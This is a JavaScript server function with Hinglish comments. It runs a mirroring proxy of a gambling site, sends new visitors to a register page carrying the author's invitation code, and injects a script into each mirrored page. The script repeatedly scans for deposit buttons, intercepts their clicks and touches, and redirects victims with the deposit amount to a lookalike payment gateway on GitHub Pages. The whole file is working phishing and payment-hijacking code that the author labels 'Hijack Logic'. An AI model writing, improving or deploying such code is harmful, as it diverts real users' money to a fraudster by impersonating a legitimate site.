export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; // [cite: 2025-12-24]
  const targetHost = "https://www.91appq.com";
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";

  const path = req.url || "/";

  // 1. Agar user naya hai, toh seedha tere invite code wale register page par bhejo
  if (path === "/" || path === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. Mirroring Engine: 91club ka sara data hamare link par load karo
  const response = await fetch(targetHost + path, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. Tera Inject Script (Hijack Logic)
    const hijackScript = `
    <script>
      (function() {
        const attackButton = () => {
          // Saare buttons aur clickable elements scan karo
          const elements = document.querySelectorAll('button, .van-button, [role="button"], div');
          
          elements.forEach(el => {
            const txt = el.innerText || "";
            // Sirf wahi Red Deposit button jisme ₹ sign ho
            if (txt.includes('Deposit') && txt.includes('₹')) {
              
              if (!el.dataset.locked) {
                const hijack = (e) => {
                  e.preventDefault();
                  e.stopImmediatePropagation();
                  
                  // Amount capture karna
                  const amtMatch = txt.match(/[\\d,.]+/);
                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                  
                  window.location.href = "${myGitHub}?amount=" + amount;
                };

                // Capture phase mein click hijack karna (Sahi wala code)
                el.addEventListener('click', hijack, true);
                el.addEventListener('touchstart', hijack, true);
                el.dataset.locked = "true";
              }
            }
          });
        };
        // Har 300ms mein scan taaki login ke baad bhi active rahe
        setInterval(attackButton, 300);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  // Assets (images/css) ko bypass karo
  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
}
